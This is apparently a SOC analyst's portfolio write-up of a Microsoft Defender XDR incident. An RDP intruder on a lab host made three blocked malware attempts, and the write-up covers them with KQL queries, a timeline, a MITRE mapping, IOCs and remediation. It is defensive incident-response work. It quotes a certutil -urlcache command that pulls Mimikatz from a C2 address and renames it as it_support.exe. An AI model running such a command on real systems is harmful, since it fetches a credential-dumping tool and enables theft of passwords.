
## Business Impact & Risk Assessment

**Portfolio Summary**

Investigated a High severity human-operated malicious activity alert in Microsoft Defender XDR. An attacker got in via RDP using stolen credentials and spent 31 minutes trying three different ways to deploy malware - two failed ZIP downloads and a LOLBin-based Mimikatz attempt via certutil. All three were blocked. Correctly separated two distinct remote IPs in the logs to avoid misattribution in the incident report. Identified an internal machine as a potential pivot point requiring separate investigation. No successful execution, no lateral movement, no exfiltration. Device isolated, cleaned, and restored. Honest gaps documented - including a missing detection rule for certutil -urlcache abuse.

---

### Business Context

This wasn't an automated infection. The logon type was RemoteInteractive — someone was physically operating this machine over RDP in real time. That means the attacker was adaptive, changing tactics twice after being blocked. The goal was credential dumping via Mimikatz. If that had worked, the attacker would have had every password on that machine and a clear path to move laterally across the network - likely ending in ransomware or full domain compromise.

---

### Business Impact Assessment

| Impact Category | Assessment |
|---|---|
| Human-operated RDP access confirmed | Real person on the machine making decisions - not automated malware |
| Three separate malware attempts in 31 minutes | Persistent adversary who adapted after each failure |
| Mimikatz credential dump attempted | If successful — full domain credential exposure |
| Internal pivot machine identified (10.159.17.126) | Attacker may have had a foothold inside the network before this alert |
| No execution, no lateral movement, no exfiltration | Attack stopped at every stage before any real damage |

If Mimikatz had run successfully - IBM Cost of a Data Breach 2024 puts the average cost of a credential-based breach at **$4.5M+**, including lateral movement, ransomware deployment, and recovery.

---

### Risk Assessment

| Risk | Severity | Reason |
|---|---|---|
| RDP with no MFA | Critical | Stolen credentials gave full interactive access with no second barrier |
| Human-operated attack | Critical | Adaptive attacker — changed methods twice in real time |
| Internal pivot machine (10.159.17.126) | High | May indicate the network was already partially compromised |
| No certutil -urlcache detection rule | High | LOLBin abuse only caught at the payload level - not at point of execution |
| PowerShell available with no restrictions | High | Two PS instances spawned freely by a standard user |
| No Script Block Logging | Medium | Obfuscated commands could run without visibility |

---

### Cost-Benefit of Preventative Controls

| Control | Cost | What it prevents |
|---|---|---|
| MFA on RDP | ~$6/user/month via Entra ID P1 | Stolen credentials alone are useless |
| certutil -urlcache KQL detection rule | £0 | Catches LOLBin abuse before the payload lands |
| PowerShell Constrained Language Mode | £0 via GPO | Limits what PowerShell can do for standard accounts |
| Script Block Logging (Event ID 4104) | £0 via GPO | Full visibility into every command run |
| Network segmentation — restrict RDP from internet | ~£5–15K one time | Takes away the initial access vector entirely |
| Investigate 10.159.17.126 separately | Analyst time | Closes any existing foothold in the network |

**Prevention cost: -£5–15K one time plus zero-cost configuration changes**
**Cost of a successful attack: $4.5M+ average**
**ROI: 100:1+**

---


## Potential Human-Operated Malicious Activity

**Date:** March 18, 2026  
**Severity:** High  
**Status:** Resolved — Closed  
**Reference:** INC-2026-0318-001  
**Platform:** Microsoft Defender XDR / Microsoft Sentinel  
**Analyst:** Gbenga  

<img width="900" height="400" alt="image" src="https://github.com/user-attachments/assets/51dd7eae-d82e-4e63-9484-5309ee93fa17" />

---

### What got my attention

The alert came in as High severity, category Malware. But what 
immediately stood out wasn't just the malware, it was the logon 
type. RemoteInteractive. That means RDP. Someone had logged into 
this machine and was sitting there operating it manually.

That changes everything. This wasn't a script that landed and 
ran automatically. There was a person on the other end making 
decisions in real time. That's what made this one interesting 
to investigate.

<img width="1000" height="700" alt="image" src="https://github.com/user-attachments/assets/cae5bdc5-685b-4465-9183-43063ab46e3c" />

---

### Root Cause - First thing I did

Before anything else I needed to confirm the logon and find out 
where it came from. I jumped into Microsoft Defender XDR and ran 
a KQL query against `DeviceLogonEvents` to pull all successful 
remote sessions on the device.

```kql
DeviceLogonEvents
| where TimeGenerated > ago(1d)
| where DeviceName == "soclab"
| where ActionType == "LogonSuccess"
| where isnotempty(RemoteIP)
| project TimeGenerated, DeviceName, RemoteIP, AccountName, LogonType, ActionType
| order by TimeGenerated desc
```

<img width="1000" height="600" alt="image" src="https://github.com/user-attachments/assets/10e48070-cbb2-481e-991f-d54b7a7c03ef" />


The results gave me two important data points that I needed to 
separate carefully.

The `DeviceLogonEvents` query returned `213.152.187.225` as the 
RemoteIP — this is the external IP that the RDP session came from 
and the likely direct attacker IP.

The alert log and process events (userinit.exe, explorer.exe) 
showed `10.159.17.126` as the remote session initiator — an 
internal IP. That tells me this internal machine was likely 
compromised and being used as a pivot point inside the network.

So I was dealing with two different remote IPs that together 
painted a clearer picture of how the attacker got in:

- **`213.152.187.225`** — external IP, direct RDP source, 
  confirmed in DeviceLogonEvents
- I observed the IP using OSINT tool (VirusTotal) and found IP was reported as phishing

<img width="800" height="442" alt="image" src="https://github.com/user-attachments/assets/01d3fb61-1bd2-4079-ab5a-b4702d93fe92" />




---

### How the attack played out

This one had three stages and they all connect. The attacker tried 
two things that failed, then changed their approach for a third 
attempt. Here's how it went.

---

**Stage 1 — First download attempt (9:43 PM)**


The attacker downloaded a ZIP file from `bazaar.abuse.ch` — a 
known malware repository. The filename was literally the file's 
own hash, which is something you see when people pull samples 
directly from threat intel platforms. It landed in the Downloads 
folder and Defender caught it almost immediately.

- File: `3a9c318...bcae.zip` (7MB)
- Path: `C:\Users\soclab\Downloads\`
- SHA1: `a61496b21ba4d0bb73b08676bd0066462e0ff2e2`
- Threat: `Trojan:Script/Wacatac.H!ml`
- The Mark of the Web flag was set — confirmed it came from the internet


Defender flagged and prevented it at 9:45 PM. First attempt — blocked.

<img width="776" height="118" alt="image" src="https://github.com/user-attachments/assets/3f590292-828b-4f27-907c-f109bbb4bd9d" />



---

**Stage 2 — Second download attempt (9:50 PM)**

They tried again seven minutes later with a different file. This 
one was tiny — only 1KB. That size is typical of a dropper, 
something designed just to pull down and execute a bigger payload. 
Same source, different file.

- File: `2828d90...d49d4.zip` (1KB)
- Path: `C:\Users\soclab\Downloads\`
- SHA1: `75481f3462f0f1a4b8707f2f67b1b6e96ecef92e`
- Threat: `Trojan:Script/Wacatac.C!ml`

Defender quarantined it at 9:52 PM and stopped explorer.exe from 
even opening it. Second attempt — blocked again.

<img width="736" height="105" alt="image" src="https://github.com/user-attachments/assets/76ef4925-3717-48c7-88cd-2da03cd2c87e" />

---

**Stage 3 — Going manual (10:03 PM) RCE Techniques**

At this point the attacker had failed twice and they knew it. 
So they shifted strategy. Instead of relying on downloaded files 
they opened Windows Terminal directly through the RDP session and 
spawned PowerShell. Two instances of it actually, which tells me 
they were actively working through options.

Then they ran this command:


certutil.exe -urlcache -f http://152.44.44.246:8080/mimikatz.exe it_support.exe

<img width="800" height="400" alt="image" src="https://github.com/user-attachments/assets/8e8b2f1f-aff4-4489-9f04-fb2ec6d021e5" />

---

I want to break this down because it's clever. `certutil.exe` is 
a legitimate Windows binary used for certificate management. 
Attackers abuse it to download files from the internet because 
it's already on every Windows machine and often trusted. 
This technique is called a LOLBin — Living off the Land Binary.

The `-urlcache -f` flags tell certutil to fetch a file from a URL 
and force-write it to disk. The file being fetched was Mimikatz — 
a well known credential dumping tool. And they renamed it 
`it_support.exe` to make it look like a legitimate IT file 
sitting on the machine. That's masquerading — T1036 in MITRE.

The goal was to dump credentials from memory and likely move 
laterally from there. Defender caught it before any of that 
happened — detected as `Trojan:Win32/Ceprolad.A` and removed 
at 10:04 PM. Third attempt — blocked.

<img width="1011" height="119" alt="image" src="https://github.com/user-attachments/assets/187100f9-2c0d-4ae3-9d91-458ea71ae4bf" />


---

### Full timeline

| Time | Event |
|------|-------|
| 9:33 PM | Normal system boot — standard process chain |
| 9:35 PM | **INITIAL ACCESS** — RDP session established. External source: `213.152.187.225`. Internal session initiator: `10.159.17.126` |
| 9:43 PM | Malicious ZIP downloaded from bazaar.abuse.ch |
| 9:45 PM | Defender blocks Wacatac.H!ml — Stage 1 stopped |
| 9:50 PM | Second malicious ZIP downloaded |
| 9:52 PM | Defender quarantines Wacatac.C!ml — Stage 2 stopped |
| 10:03 PM | Windows Terminal opened — two PowerShell instances spawned |
| 10:04 PM | certutil LOLBin used to pull Mimikatz from C2 server `152.44.44.246:8080` |
| 10:04 PM | Defender blocks Ceprolad.A — Stage 3 stopped |

---

### MITRE ATT&CK mapping

| Tactic | Technique | What I saw |
|--------|-----------|------------|
| Initial Access | T1078 — Valid Accounts | RDP using compromised credentials |
| Execution | T1059.001 — PowerShell | Two PS instances spawned manually |
| Defense Evasion | T1218.013 — Certutil | certutil -urlcache to download payload |
| Defense Evasion | T1036 — Masquerading | mimikatz renamed as it_support.exe |
| Credential Access | T1003 — Credential Dumping | Mimikatz download attempt |
| Command & Control | T1071.001 — Web Protocols | HTTP C2 at 152.44.44.246:8080 |

---

### IOCs

| Type | Value | Notes |
|------|-------|-------|
| IP — External RDP Source | 213.152.187.225 | Confirmed in DeviceLogonEvents — direct attacker IP |
| IP — Internal Pivot Machine | 10.159.17.126 | Session initiator in process events — needs own investigation |
| IP — C2 Server | 152.44.44.246:8080 | Mimikatz download source |
| File SHA1 | a61496b21ba4d0bb73b08676bd0066462e0ff2e2 | Wacatac.H!ml ZIP |
| File SHA1 | 75481f3462f0f1a4b8707f2f67b1b6e96ecef92e | Wacatac.C!ml ZIP |
| Script SHA256 | b58197ad02b51f9f344a1575feee6562f461d7ce3da3752de9537ad06b9571db | PowerShell certutil script |
| Masqueraded file | it_support.exe | Mimikatz renamed to evade detection |
| C2 URL | http://152.44.44.246:8080/mimikatz.exe | Blocked |

---

### What I did about it

**Containment**

Once I confirmed this was real and active I moved quickly. 
I isolated the device from the network so the attacker couldn't 
continue operating. I disabled the `soclab` user account, revoked 
the active RDP session, and blocked all the malicious hashes,
URLs, and both the external attacker IP and the C2 IP across 
the environment. I also flagged `10.159.17.126` for a separate 
investigation as a potentially compromised internal machine.

<img width="1000" height="500" alt="image" src="https://github.com/user-attachments/assets/8332fa12-d517-428c-b997-f468030a7399" />

---

<img width="800" height="400" alt="image" src="https://github.com/user-attachments/assets/47c00303-e5b8-45af-98d9-27605739e325" />

---


**Eradication**

I ran a full AV scan on the device, came back clean. Then I went 
deeper. I queried across `DeviceFileEvents`, `DeviceProcessEvents` 
and `DeviceNetworkEvents` in KQL to check whether `it_support.exe` 
had done anything before Defender caught it, and to look for any 
persistence mechanisms — scheduled tasks, registry run keys, 
startup folder changes. Found nothing.

<img width="800" height="496" alt="image" src="https://github.com/user-attachments/assets/d5ca758a-ad26-4d88-9590-165014b2e8f1" />

---

**Recovery**

Once I was satisfied the device was clean I brought it back online 
and re-enabled the user account with a forced password reset. 
I put enhanced monitoring on the host and account going forward.

---

### How I closed it

> The attacker gained access via RDP originating externally from 
> `213.152.187.225` and the session was also linked to an internal 
> machine at `10.159.17.126` which may have been a compromised 
> pivot point. Three separate attempts to deploy malware were made 
> and blocked by Microsoft Defender — two failed ZIP downloads and 
> one LOLBin-based Mimikatz credential dumping attempt. Nothing 
> executed successfully. No confirmed data exfiltration or lateral 
> movement was observed. Device isolated, cleaned and restored. 
> User account secured. All IOCs blocked.  
> **Alert Closed — Resolved.**

---

### Honest gaps I found

The two remote IPs were the most important thing to get right in 
this investigation. `213.152.187.225` is what the logon data 
actually shows — the real source IP of the RDP session confirmed 
in `DeviceLogonEvents`. `10.159.17.126` appears separately in the 
process event logs as the session initiator. Mixing these up or 
treating them as the same thing would be a significant error in 
a real incident report.

I also noted that certutil LOLBin abuse shouldn't rely solely 
on Defender to catch it downstream. There should be a dedicated 
detection rule that fires the moment certutil is called with 
`-urlcache`. That's a detection coverage gap worth addressing.


<img width="1300" height="532" alt="image" src="https://github.com/user-attachments/assets/ed58fcbb-27d3-4557-b76d-6daf9379938d" />

---

### Recommendations

- Enforce MFA on all remote access and RDP accounts — valid 
  credentials alone should never be enough
- Block and investigate `213.152.187.225` — confirmed external attacker IP
- Investigate `10.159.17.126` as a potentially compromised 
  internal pivot machine — treat as a separate incident
- Create a dedicated alert rule for certutil.exe with -urlcache flag
- Restrict PowerShell with Constrained Language Mode for 
  standard user accounts
- Enable PowerShell Script Block Logging (Event ID 4104)
- Disable legacy authentication protocols
- Force credential reset for the affected account and review 
  accounts on the same network segment

---


## Tools I used

- Microsoft Sentinel
- Microsoft Defender XDR
- KQL (Kusto Query Language)
- MITRE ATT&CK Navigator
- MalwareBazaar

---

## About

I'm Gbenga — a SOC analyst building real skills through hands-on 
lab practice. I'm working toward a role in threat detection and 
incident response. Every case in this repo is something I actually 
worked through and documented myself. Open to entry-level SOC 
and IR opportunities.
